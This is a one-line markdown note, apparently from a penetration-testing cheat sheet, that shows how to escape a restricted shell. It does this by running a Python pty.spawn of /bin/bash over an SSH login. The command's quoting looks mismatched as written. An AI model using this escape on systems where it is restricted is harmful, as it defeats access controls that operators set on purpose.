---
description: Invoke python at ssh login
---

# SSH login to access CLI (restricted env escape)

`ssh user@host "python -c \"import pty; pty.spawn('/bin/bash")\""`
